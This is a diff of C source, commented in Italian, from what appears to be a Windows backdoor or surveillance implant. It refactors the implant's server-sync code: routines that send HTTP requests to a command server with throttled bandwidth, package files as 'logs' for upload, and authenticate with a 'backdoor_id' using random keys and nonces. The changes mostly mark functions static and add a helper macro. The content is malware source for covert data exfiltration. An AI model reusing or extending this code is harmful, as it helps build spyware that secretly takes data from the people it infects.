@@ -1,3 +1,4 @@
+#include <stdint.h>
 #include "../common.h"
 #include "../H4-DLL.h" 
 #include "../AM_Core.h"
@@ -75,7 +76,7 @@ BOOL ASP_StartASPThread(DWORD dwPid, ASP_THREAD *asp_thread)
 // Funzioni IPC command per ASP   //
 ////////////////////////////////////
 // Usata dall'host ASP per attaccarsi alla shared memory
-BOOL ASP_IPCAttach()
+static BOOL ASP_IPCAttach()
 {
 	HANDLE hFile = FNC(OpenFileMappingA)(FILE_MAP_ALL_ACCESS, FALSE, shared.SHARE_MEMORY_ASP_COMMAND_NAME);
 
@@ -191,8 +192,10 @@ static void rand_bin_seq(BYTE *buffer, DWORD buflen)
 		buffer[i] = rand();
 }
 
+#define rand_bin_seq_s(dst) rand_bin_seq(dst, sizeof(dst))
+
 // Invia il tmp rispettando il limite di banda di byte_per_second
-BOOL BandSafeDataSend(BYTE *buf, DWORD len, DWORD byte_per_second)
+static BOOL BandSafeDataSend(BYTE *buf, DWORD len, DWORD byte_per_second)
 {
 #define SAMPLING_RATE 100
 	DWORD byte_per_sample = byte_per_second/SAMPLING_RATE;
@@ -246,7 +249,7 @@ BOOL BandSafeDataSend(BYTE *buf, DWORD len, DWORD byte_per_second)
 
 // Invia una richiesta HTTP e legge la risposta
 // Alloca il tmp con la risposta (che va poi liberato dal chiamante)
-BOOL HttpTransaction(BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *response_len, DWORD byte_per_second)
+static BOOL HttpTransaction(BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *response_len, DWORD byte_per_second)
 {
 	WCHAR szContentLength[32];
 	DWORD cch = sizeof(szContentLength);
@@ -294,7 +297,7 @@ BOOL HttpTransaction(BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *res
 
 // Crea il tmp da inviare per un comando piu' messaggio
 // il tmp ritornato va liberato
-BYTE *PrepareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_len)
+static BYTE *PrepareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_len)
 {
 	SHA1Context sha;
 	DWORD tot_len, pad_len, i;
@@ -367,7 +370,7 @@ BYTE *PrepareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_len
 
 // Formatta il tmp per l'invio di un log
 // Non usa PrepareCommand per evitare di dover allocare due volte la dimensione del file
-BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
+static BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
 {
 	SHA1Context sha;
 	DWORD tot_len, pad_len, i;
@@ -448,7 +451,7 @@ BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
 }
 
 // Risolve server_url
-BOOL H_ASP_ResolveName(char *server_url, char *addr_to_connect, DWORD buflen)
+static BOOL H_ASP_ResolveName(char *server_url, char *addr_to_connect, DWORD buflen)
 {
 	struct hostent *hAddress;
 	char *addr_ptr;
@@ -577,7 +580,6 @@ BOOL H_ASP_WinHTTPSetup(char *server_url, char *addr_to_connect, DWORD buflen, D
 	return TRUE;
 }
 
-
 //////////////////////////////////////////////
 // Funzioni che eseguono i comandi del core //
 //////////////////////////////////////////////
@@ -604,8 +606,8 @@ static BOOL H_ASP_Auth(char *signature, DWORD sig_len, char *backdoor_id, DWORD 
 
 	// Costruisce il tmp
 	ZeroMemory(buffer, sizeof(buffer));
-	rand_bin_seq(client_key, 16);
-	rand_bin_seq(nonce_payload, 16);
+	rand_bin_seq_s(client_key);
+	rand_bin_seq_s(nonce_payload);
 	
 	SHA1Reset(&sha);
 	ZeroMemory(sha1buf, sizeof(sha1buf));
@@ -626,6 +628,9 @@ static BOOL H_ASP_Auth(char *signature, DWORD sig_len, char *backdoor_id, DWORD 
 	if (!SHA1Result(&sha)) 
 		return FALSE;
 
+	ptr = buffer;
+
+	//mmemcpy(ptr, client_key, 16, nonce_payload, sizeof(nonce_payload), backdoor_id, bid_len, instance, inst_len, subtype, sub_len);
 	ptr = buffer;
 	memcpy(ptr, client_key, 16); 
 	ptr+=16;
